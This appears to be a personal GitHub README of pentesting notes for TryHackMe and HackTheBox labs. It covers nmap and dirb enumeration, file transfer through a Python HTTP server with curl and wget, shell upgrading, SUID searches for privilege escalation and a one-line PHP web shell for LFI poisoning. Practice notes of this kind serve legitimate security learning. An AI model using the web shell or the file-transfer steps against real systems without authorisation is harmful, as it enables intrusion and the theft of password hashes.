# usefulpentestinfo
Collection of scripts, tools, and other useful stuff I've found for pentesting.

## Virtual Machine Setup
I use https://www.virtualbox.org/ with a Kali Linux image from https://www.kali.org/get-kali/#kali-virtual-machines .

If you're using a VPN on your host machine, make sure to enable NAT, and use the "Paravirtualized network adapter (virtio-net)" with the "Cable Connected" option enabled. 

Otherwise even if you're using a VPN on your host, the VM will basically skip the VPN connection and access the internet directly.

If you're using the TryHackMe OpenVPN connection, and you're able to nmap/ping hosts, but not able to access them through your browser use:

`sudo ifconfig tun0 mtu 1200`

## Miscellaneous Useful Stuff
`IP=xxx.xxx.xxx.xxx && export $IP` <- Target IP Here - A easy way to save yourself tons of typing the same IP addr over and over again.

Then whenever you run a command, you can just use `$IP` to use that saved IP Addr.

EXAMPLE: `nmap -A -T4 $IP`

## Web Page Enumeration

`dirb http://$IP/ /$WORDLIST/` - Useful for finding directories, hidden or not, on a web page. Included with Kali are the dirb and dirbuster wordlists inside /usr/share/wordlists. I usually use either /usr/share/wordlists/dirb/big.txt or /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt to begin with. If you're not finding anything, make sure to try out some of the other wordlists.

## Login Brute Forcing

## Hosting Files

`python3 -m http.server` or `python3 -m http.server *CUSTOM PORT*` - This command will run a HTTP server with the home directory coming from wherever you ran it. This can be used as a platform to download shells,scripts and whatever else you want onto a target box. Or if the box has python installed, a way to exfiltrate files off of the box.

`curl http://$YOURIP/file.txt --output example-file` or `wget http://$YOURIP/file.txt` - Using these commands, with $YOURIP replaced with whatever box is hosting the Python http.server on it, will allow you to download files of your choice. I usually use this to either upload scripts such as LinEnum or LinPeas onto a box for enumeration, or in the reverse direction to pull things like password hashes off of the box.


## Upgrading Shells
`python -c 'import pty; pty.spawn("/bin/bash")'` - If the box has Python installed on it, this is a solid way to upgrade your shell into a interactive one.
## Update Scripts
`apt-get update && apt-get upgrade && yum update`

## LFI Poisoning 

If the system is hosting a web-server, you can try 
`<?php system($_GET['c']); ?>`
## NMAP Scans
`nmap -T4 -p- $IP` - The first scan I usually run, quickly scans for every port on a box. A lot of TryHackMe and HackTheBox rooms will have some random service hosted on a high port.

`nmap -A -T4 -p {PORT1,PORT2,PORT3} $IP` - I then run a scan with -A (enables OS detection (-O), version scanning (-sV), script scanning
    (-sC) and traceroute (--traceroute)) and I do specific port scanning for the port numbers found in the first scan.

## SMB Enum

## Password Cracking

## Privilege Escalation - Linux
`sudo -l` - Lists files that the current user can run as root without password.

`find / -perm -g=s -o -perm -u=s -type f 2>/dev/null` - Seach for files with a SGID or SUID bit set

``for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done`` - Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other \*bin, for SGID or SUID (Quicker search)

If any of the above scripts find something, search the command/file on https://gtfobins.github.io/, you can usually go into a root shell, or read files that you don't have access to with this.
